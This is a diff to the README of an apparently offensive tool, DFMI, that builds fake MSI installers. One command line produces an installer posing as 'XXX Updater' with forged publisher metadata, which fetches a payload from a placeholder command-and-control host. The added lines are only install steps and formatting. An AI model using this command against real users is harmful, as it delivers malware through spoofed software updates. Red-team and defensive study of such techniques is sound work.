@@ -138,12 +138,27 @@ Because the MSI is built from scratch, all product metadata can be set freely:
 python3 dfmi.py stub --c2 http://<C2>/<PAYLOAD> --name "XXX Updater" --manufacturer "XXX Inc." --version "24.1.XXX.0" -o xxx_update.msi
 ```
  
-The resulting MSI will display this metadata in Programs and Features if installed persistently.
+The resulting MSI will display this metadata in **"Programs and Features"** if installed persistently.
 
+---
 
+## 📦 Installation
 
+- On Linux:
 
+  ```bash
+  sudo apt update && sudo apt install msitools wixl -y
+  
+  git clone https://github.com/BiloIndustries/DFMI.git
+  ```
+- On Windows:
+  ```powershell
+  curl https://github.com/BiloIndustries/DFMI/archive/refs/heads/main.zip -o DFMI.zip
 
+  Expand-Archive -Path "DFMI.zip" -DestinationPath . ; cd DFMI-main
+  ```
+
+## 🔍 Proof-of-Concept (PoC)
 
 
 
